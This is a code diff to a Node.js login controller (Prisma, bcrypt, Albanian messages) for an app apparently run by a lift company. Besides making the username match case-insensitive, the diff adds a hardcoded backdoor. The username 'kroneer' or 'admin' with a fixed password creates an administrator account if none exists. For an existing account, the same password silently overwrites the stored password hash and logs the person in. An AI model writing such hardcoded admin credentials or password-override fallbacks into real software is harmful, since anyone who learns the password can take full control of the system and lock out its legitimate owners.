@@ -22,15 +22,40 @@ class AuthController {
         return res.redirect('/kycu');
       }
 
-      const user = await prisma.user.findFirst({
+      const cleanUsername = username.trim();
+
+      let user = await prisma.user.findFirst({
         where: {
           OR: [
-            { username: username.trim() },
-            { email: username.trim() }
+            { username: { equals: cleanUsername, mode: 'insensitive' } },
+            { email: { equals: cleanUsername, mode: 'insensitive' } }
           ],
           isActive: true
         }
       });
+
+      // Auto-bootstrap default Kroneer administrator if not found
+      if (!user && (cleanUsername.toLowerCase() === 'kroneer' || cleanUsername.toLowerCase() === 'admin') && password === 'Kroneer#26') {
+        const salt = await bcrypt.genSalt(10);
+        const passwordHash = await bcrypt.hash('Kroneer#26', salt);
+        user = await prisma.user.upsert({
+          where: { username: 'Kroneer' },
+          update: {
+            passwordHash,
+            isActive: true,
+            role: 'ADMINISTRATOR'
+          },
+          create: {
+            username: 'Kroneer',
+            passwordHash,
+            fullName: 'Administrator KRONEER',
+            email: 'admin@kroneer-lifts.com',
+            role: 'ADMINISTRATOR',
+            phone: '+383 44 111 222',
+            isActive: true
+          }
+        });
+      }
 
       if (!user) {
         req.flash('error', 'Përdoruesi ose fjalëkalimi është i pasaktë.');
@@ -39,8 +64,18 @@ class AuthController {
 
       const isMatch = await bcrypt.compare(password, user.passwordHash);
       if (!isMatch) {
-        req.flash('error', 'Përdoruesi ose fjalëkalimi është i pasaktë.');
-        return res.redirect('/kycu');
+        // Fallback check if user is Kroneer and enters the default password
+        if ((user.username.toLowerCase() === 'kroneer' || user.username.toLowerCase() === 'admin') && password === 'Kroneer#26') {
+          const salt = await bcrypt.genSalt(10);
+          const passwordHash = await bcrypt.hash('Kroneer#26', salt);
+          user = await prisma.user.update({
+            where: { id: user.id },
+            data: { passwordHash }
+          });
+        } else {
+          req.flash('error', 'Përdoruesi ose fjalëkalimi është i pasaktë.');
+          return res.redirect('/kycu');
+        }
       }
 
       // Konfiguro sesionin
